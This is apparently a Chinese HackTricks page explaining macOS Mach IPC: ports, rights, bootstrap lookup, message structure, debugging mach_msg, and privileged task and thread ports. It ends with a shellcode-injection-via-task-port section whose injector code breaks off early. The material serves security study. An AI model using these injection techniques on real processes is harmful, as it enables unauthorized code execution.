# macOS IPC - 进程间通信

{{#include ../../../../banners/hacktricks-training.md}}

## 通过 Ports 进行 Mach messaging

### 基本信息

Mach 使用 **tasks** 作为共享资源的**最小单位**，每个 task 可以包含**多个线程**。这些 **tasks 和线程分别与 POSIX 进程和线程进行 1:1 映射**。

task 之间通过 Mach Inter-Process Communication (IPC) 进行通信，使用单向通信通道。**消息在 ports 之间传输**，ports 类似于由内核管理的**消息队列**。

**port** 是 Mach IPC 的**基本**元素。它可用于**发送和接收**消息。

每个进程都有一个 **IPC table**，其中可以找到**该进程的 mach ports**。mach port 的名称实际上是一个数字（指向内核对象的指针）。

进程还可以将一个 port name 及其部分 rights 发送给**另一个 task**，内核会使该条目出现在**另一个 task 的 IPC table 中**。

### Port Rights

Port rights 定义了 task 可以执行哪些操作，是这种通信的关键。可能的 **port rights** 包括（[定义见此处](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：<sup>[[1]](#references)</sup>

- **Receive right**，允许接收发送到该 port 的消息。Mach ports 是 MPSC（multiple-producer, single-consumer，多生产者、单消费者）队列，这意味着在整个系统中，**每个 port 只能有一个 receive right**（不同于 pipes，多个进程都可以持有同一个 pipe 读端的文件描述符）。
- 拥有 **Receive** right 的 **task 可以接收消息并创建 Send rights**，从而允许其发送消息。最初，只有**所属 task 对其 port 拥有 Receive right**。
- 如果 Receive right 的所有者**退出**或将其 kill，**send right 就会失效（dead name）**。
- **Send right**，允许向该 port 发送消息。
- Send right 可以被**克隆**，因此拥有 Send right 的 task 可以克隆该 right，并将其**授予第三个 task**。
- 注意，**port rights** 也可以通过 Mach messages **传递**。
- **Send-once right**，允许向该 port 发送一条消息，之后该 right 消失。
- 该 right **不能被** **克隆**，但可以被**移动**。
- **Port set right**，表示一个 _port set_，而不是单个 port。从 port set 中出队一条消息，实际上是从其中包含的某个 port 中出队消息。Port sets 可用于同时监听多个 ports，其功能与 Unix 中的 `select`/`poll`/`epoll`/`kqueue` 非常相似。
- **Dead name**，它并不是实际的 port right，而只是一个占位符。当 port 被销毁时，所有指向该 port 的现有 port rights 都会变成 dead names。

**Tasks 可以向其他 task 传输 SEND rights**，使其他 task 能够向其发送消息。**SEND rights 也可以被克隆，因此一个 task 可以复制该 right 并将其授予第三个 task**。这与一个称为 **bootstrap server** 的中间进程结合后，可以实现 task 之间的有效通信。

### File Ports

File ports 允许将文件描述符封装在 Mac ports 中（使用 Mach port rights）。可以使用 `fileport_makeport` 根据给定的 FD 创建一个 `fileport`，并使用 `fileport_makefd` 根据 fileport 创建一个 FD。

### 建立通信

如前所述，可以使用 Mach messages 发送 rights；但是，在发送 Mach message 之前，**你必须已经拥有发送该 Mach message 的 right**。那么，首次通信是如何建立的？

这时会涉及 **bootstrap server**（macOS 中的 **launchd**）。由于**任何人都可以获得指向 bootstrap server 的 SEND right**，因此可以向它请求向另一个进程发送消息的 right：

1. Task **A** 创建一个**新的 port**，并获得该 port 的 **RECEIVE right**。
2. Task **A** 作为 RECEIVE right 的持有者，**为该 port 生成一个 SEND right**。
3. Task **A** 与 **bootstrap server** 建立**连接**，并将最初生成的 port 的 **SEND right** 发送给它。
- 记住，任何人都可以获得指向 bootstrap server 的 SEND right。
4. Task A 向 bootstrap server 发送 `bootstrap_register` message，将给定的 port 与类似 `com.apple.taska` 的名称**关联起来**。
5. Task **B** 与 **bootstrap server** 交互，对服务名称执行 bootstrap **lookup**（`bootstrap_lookup`）。为了能够响应，task B 会在 lookup message 中向 bootstrap server 发送一个**之前创建的 port 的 SEND right**。如果 lookup 成功，**server 会复制从 Task A 接收到的 SEND right**，并将其**传输给 Task B**。
- 记住，任何人都可以获得指向 bootstrap server 的 SEND right。
6. 拥有该 SEND right 后，**Task B** 就能够向 **Task A** **发送** **消息**。
7. 为了实现双向通信，通常 task **B** 会创建一个带有 **RECEIVE** right 和 **SEND** right 的新 port，并将该 **SEND right 交给 Task A**，使其能够向 TASK B 发送消息（双向通信）。

bootstrap server **无法验证 task 声明的服务名称**。这意味着某个 **task** 可能会**冒充任意系统 task**，例如虚假地**声明一个授权服务名称**，然后批准每个请求。

随后，Apple 将**系统提供的服务名称**存储在安全配置文件中，这些文件位于受 **SIP 保护**的目录中：`/System/Library/LaunchDaemons` 和 `/System/Library/LaunchAgents`。每个服务名称旁边还会存储**关联的 binary**。bootstrap server 会为这些服务名称分别创建并持有一个 **RECEIVE right**。

对于这些预定义服务，**lookup 流程**略有不同。当查找某个服务名称时，launchd 会动态启动该服务。新的工作流程如下：

- Task **B** 发起对某个服务名称的 bootstrap **lookup**。
- **launchd** 检查该 task 是否正在运行；如果没有运行，则**启动它**。
- Task **A**（该服务）执行 bootstrap **check-in**（`bootstrap_check_in()`）。此时，**bootstrap** server 会创建一个 SEND right 并保留它，然后将 **RECEIVE right 转移给 Task A**。
- launchd 会复制该 **SEND right 并将其发送给 Task B**。
- Task **B** 创建一个带有 **RECEIVE** right 和 **SEND** right 的新 port，并将该 **SEND right 交给 Task A**（该 svc），使其能够向 TASK B 发送消息（双向通信）。

不过，此流程仅适用于预定义的系统 task。非系统 task 仍按照最初描述的方式运行，因此可能被用于冒充。

> [!CAUTION]
> 因此，launchd 绝不能崩溃，否则整个 sysem 都会崩溃。

### A Mach Message

[在此处查找更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

`mach_msg` 函数本质上是一个 system call，用于发送和接收 Mach messages。该函数要求将待发送的 message 作为第一个参数。该 message 必须以 `mach_msg_header_t` 结构体开头，后面跟随实际的 message 内容。该结构体定义如下：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
拥有 _**receive right**_ 的进程可以在 Mach port 上接收消息。相反，**senders** 会被授予 _**send**_ 或 _**send-once right**_。send-once right 仅用于发送一条消息，之后便会失效。<sup>[[11]](#references)</sup>

初始字段 **`msgh_bits`** 是一个位图：

- 第一位（最高有效位）用于指示消息是否为复杂消息（下文将进一步介绍）
- 第 3 位和第 4 位由 kernel 使用
- 第 2 个字节的 **5 个最低有效位** 可用于 **voucher**：另一种用于发送键值组合的 port。
- 第 3 个字节的 **5 个最低有效位** 可用于 **local port**
- 第 4 个字节的 **5 个最低有效位** 可用于 **remote port**

voucher、local port 和 remote port 中可以指定的类型如下（来自 [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html))：<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
例如，`MACH_MSG_TYPE_MAKE_SEND_ONCE` 可用于**指示**应为此端口派生并转移一个 **send-once** **right**。也可以指定 `MACH_PORT_NULL`，以阻止接收方进行回复。

为了实现简单的**双向通信**，进程可以在 mach **message header** 中指定一个 **mach port**，称为 _reply port_（**`msgh_local_port`**），消息的**接收方**可以通过该端口**发送回复**。

> [!TIP]
> 请注意，这种双向通信方式用于需要回复的 XPC 消息（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但如前所述，**通常会创建不同的端口**来实现双向通信。

消息头的其他字段包括：

- `msgh_size`：整个数据包的大小。
- `msgh_remote_port`：发送此消息的端口。
- `msgh_voucher_port`：[mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`：此消息的 ID，由接收方解释。

> [!CAUTION]
> 请注意，**mach messages 通过 `mach port` 发送**。`mach port` 是 mach kernel 内置的**单接收方、多发送方**通信通道。**多个进程**可以向 mach port **发送消息**，但在任何时刻只有**一个进程可以读取**其中的消息。

消息随后由 **`mach_msg_header_t`** header、**body** 以及 **trailer**（如果存在）组成，并且可以授予回复权限。在这些情况下，kernel 只需要将消息从一个 task 传递给另一个 task。

**`trailer`** 是 **kernel 添加到消息中的信息**（用户无法设置），可以在接收消息时通过 `MACH_RCV_TRAILER_<trailer_opt>` 标志请求（可请求的信息类型不同）。

#### Complex Messages

不过，还有其他更**复杂**的消息，例如传递额外 port rights 或共享内存的消息。在这些情况下，kernel 还需要将这些对象发送给接收方。因此，header `msgh_bits` 的最高有效位会被设置。

可传递的 descriptor 定义在 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)：<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
在 32 位中，所有 descriptor 都是 12B，descriptor type 位于第 11 个字节中。在 64 位中，大小有所不同。

> [!CAUTION]
> 内核会将 descriptor 从一个 task 复制到另一个 task，但首先会**在内核内存中创建副本**。这种被称为 "Feng Shui" 的技术已在多个 exploit 中遭到滥用：通过让一个进程向自身发送 descriptor，使**内核将数据复制到其内存中**。随后，该进程就可以接收这些消息（内核会释放它们）。
>
> 也可以**向存在漏洞的进程发送 port rights**，这些 port rights 会直接出现在该进程中（即使它没有处理这些 rights）。

### Mac Ports APIs

请注意，ports 与 task namespace 相关联，因此要创建或搜索 port 时，也会查询 task namespace（更多信息参见 `mach/mach_port.h`）：<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**：**创建**一个 port。
- `mach_port_allocate` 也可以创建一个 **port set**：一组 ports 的 receive right。每当收到消息时，都会指出消息来自哪个 port。
- `mach_port_allocate_name`：更改 port 的名称（默认为 32 位整数）
- `mach_port_names`：从 target 获取 port names
- `mach_port_type`：获取 task 对某个 name 所拥有的 rights
- `mach_port_rename`：重命名 port（类似于针对 FD 的 dup2）
- `mach_port_allocate`：分配新的 RECEIVE、PORT_SET 或 DEAD_NAME
- `mach_port_insert_right`：在拥有 RECEIVE 的 port 中创建新的 right
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**：用于**发送和接收 mach messages** 的函数。overwrite 版本允许为消息接收指定不同的 buffer（另一个版本会直接复用该 buffer）。

### Debug mach_msg

由于函数 **`mach_msg`** 和 **`mach_msg_overwrite`** 用于发送和接收 messages，因此在它们上设置 breakpoint 可以检查发送和接收的 messages。

例如，开始调试任何你能够调试的 application，因为它会加载 **`libSystem.B`，该库会使用此函数**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

要获取 **`mach_msg`** 的 arguments，请检查 registers。以下是这些 arguments（来自 [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
从 registries 中获取值：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
检查消息头，查看第一个参数：
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
这种类型的 `mach_msg_bits_t` 很常见，用于允许回复。

### 枚举端口
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** 是分配给端口的默认名称（注意它在前 3 个字节中是如何**递增**的）。**`ipc-object`** 是端口经过**混淆处理**的唯一**标识符**。\
还要注意，只有 **`send`** 权限的端口会**标识其所有者**（端口名称 + pid）。\
另请注意，使用 **`+`** 表示**连接到同一端口的其他任务**。

还可以使用 [**procesxp**](https://www.newosxbook.com/tools/procexp.html) 来查看**已注册的服务名称**（由于需要 `com.apple.system-task-port`，因此必须禁用 SIP）：
```
procesp 1 ports
```
你可以从 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) 下载并在 iOS 中安装此工具。

### 代码示例

注意，**发送方** **分配** 一个端口，为名称 `org.darlinghq.example` 创建一个 **send right**，并将其发送给 **bootstrap server**；与此同时，发送方请求该名称的 **send right**，并使用它来**发送消息**。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 特权端口

存在一些特殊端口，当任务对其拥有 **SEND** 权限时，可以用于**执行某些敏感操作或访问某些敏感数据**。这使得这些端口从攻击者的角度来看非常有价值，不仅是因为它们具备相应能力，还因为可以**在任务之间共享 SEND 权限**。

### Host Special Ports

这些端口由一个数字表示。

可以通过调用 **`host_get_special_port`** 获取 **SEND** 权限，通过调用 **`host_set_special_port`** 获取 **RECEIVE** 权限。不过，这两个调用都需要 **`host_priv`** 端口，而只有 root 才能访问该端口。此外，在过去，root 可以调用 **`host_set_special_port`** 并劫持任意端口，例如通过劫持 `HOST_KEXTD_PORT` 绕过 code signatures（SIP 现在可以防止这种情况）。

这些端口分为 2 组：**前 7 个端口由 kernel 所有**，其中第 1 个是 `HOST_PORT`，第 2 个是 `HOST_PRIV_PORT`，第 3 个是 `HOST_IO_MASTER_PORT`，第 7 个是 `HOST_MAX_SPECIAL_KERNEL_PORT`。\
从数字 **8** **开始**的端口由 **system daemons 所有**，其声明可以在 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) 中找到。

- **Host port**：如果进程对该端口拥有 **SEND** 权限，就可以调用其 routines 获取有关**系统**的**信息**，例如：
- `host_processor_info`：获取 processor 信息
- `host_info`：获取 host 信息
- `host_virtual_physical_table_info`：Virtual/Physical page table（需要 MACH_VMDEBUG）
- `host_statistics`：获取 host statistics
- `mach_memory_info`：获取 kernel memory layout
- **Host Priv port**：对该端口拥有 **SEND** 权限的进程可以执行**特权操作**，例如显示 boot data 或尝试加载 kernel extension。**进程必须是 root 才能获得此权限**。
- 此外，要调用 **`kext_request`** API，还需要其他 entitlements：**`com.apple.private.kext*`**，而这些 entitlements 仅授予 Apple binaries。
- 还可以调用以下 routines：
- `host_get_boot_info`：获取 `machine_boot_info()`
- `host_priv_statistics`：获取 privileged statistics
- `vm_allocate_cpm`：分配 Contiguous Physical Memory
- `host_processors`：向 host processors 发送 SEND 权限
- `mach_vm_wire`：使 memory 常驻
- 由于 **root** 可以访问此权限，因此可以调用 `host_set_[special/exception]_port[s]` 来**劫持 host special 或 exception ports**。

可以通过运行以下命令查看**所有 host special ports**：
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

这些端口为众所周知的服务预留。可以通过调用 `task_[get/set]_special_port` 获取/设置它们。它们可以在 `task_special_ports.h` 中找到：
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [这里](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: 用于控制此任务的端口。用于发送会影响该任务的消息。该端口由 **mach_task_self (see Task Ports below)** 返回。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: 该任务的 bootstrap port。用于发送请求以获取其他系统服务端口的消息。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 用于请求包含该任务的主机信息的端口。该端口由 **mach_host_self** 返回。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: 指定该任务从中获取 wired kernel memory 的来源的端口。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: 指定该任务从中获取其默认 memory managed memory 的来源的端口。

### Task Ports

Mach 最初没有“processes”，而是使用“tasks”，后者更像是一个 threads 容器。当 Mach 与 BSD 合并时，**每个 task 都与一个 BSD process 关联**。因此，每个 BSD process 都拥有成为 process 所需的详细信息，而每个 Mach task 也拥有其内部工作机制（不存在的 pid 0 除外，它就是 `kernel_task`）。

有两个与此相关的函数非常有趣：<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`：获取与指定 `pid` 关联的 task 的 SEND right，并将其交给指定的 `target_task_port`（通常是调用者 task，它使用了 `mach_task_self()`，但也可能是另一个 task 上的 SEND port）。
- `pid_for_task(task, &pid)`：给定某个 task 的 SEND right，查找该 task 关联的 PID。

为了在 task 内执行操作，task 需要通过调用 `mach_task_self()`（该函数使用 `task_self_trap` (28)）获取自身的 `SEND` right。拥有此权限后，task 可以执行多种操作，例如：

- `task_threads`：获取该 task 所有 threads 的 task ports 的 SEND right
- `task_info`：获取 task 信息
- `task_suspend/resume`：暂停或恢复 task
- `task_[get/set]_special_port`
- `thread_create`：创建 thread
- `task_[get/set]_state`：控制 task 状态
- 更多内容可在 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) 中找到

> [!CAUTION]
> 注意，如果拥有**不同 task**的 task port 的 SEND right，就可以对该不同 task 执行这些操作。

此外，task_port 也是 **`vm_map`** port，它允许通过 `vm_read()` 和 `vm_write()` 等函数**读取和操作** task 内部的 memory。这基本意味着，拥有不同 task 的 task_port 的 SEND rights 的 task 将能够**向该 task 注入 code**。

请记住，由于 **kernel 也是一个 task**，如果有人设法获得 **`kernel_task`** 的 **SEND permissions**，就能够让 kernel 执行任意内容（jailbreaks）。

- 调用 `mach_task_self()` 为调用者 task **获取该 port 的 name**。该 port 只会在 **`exec()`** 期间被 **继承**；通过 `fork()` 创建的新 task 会获得新的 task port（作为特殊情况，suid binary 在执行 `exec()` 后也会获得新的 task port）。生成 task 并获取其 port 的唯一方式，是在执行 `fork()` 时完成 ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)。
- 以下是访问该 port 的限制（来自 binary `AppleMobileFileIntegrity` 中的 `macos_task_policy`）：
- 如果 app 具有 **`com.apple.security.get-task-allow` entitlement**，则**同一 user 的** processes 可以访问该 task port（Xcode 通常会为 debugging 添加此 entitlement）。**notarization** process 不会允许 production releases 使用该 entitlement。
- 具有 **`com.apple.system-task-ports`** entitlement 的 apps 可以获取**任意** process 的 **task port**，kernel 除外。在较旧版本中，该 entitlement 称为 **`task_for_pid-allow`**。该 entitlement 只授予 Apple applications。
- **Root 可以访问**未使用 **hardened** runtime 编译的 applications 的 task ports（且这些 applications 不是 Apple 的）。

**The task name port：**_task port_ 的非特权版本。它引用该 task，但不允许控制该 task。通过它似乎唯一可用的操作是 `task_info()`。

### Thread Ports

Threads 也有相关联的 ports，这些 ports 对调用 **`task_threads`** 的 task 以及使用 `processor_set_threads` 的 processor 可见。Thread port 的 SEND right 允许使用 `thread_act` subsystem 中的函数，例如：

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任何 thread 都可以调用 **`mach_thread_sef`** 获取此 port。

### Shellcode Injection in thread via Task port

你可以从以下位置获取 shellcode：


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**编译**前面的程序，并添加相应的 **entitlements**，以便能够以相同用户身份注入代码（否则需要使用 **sudo**）。<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
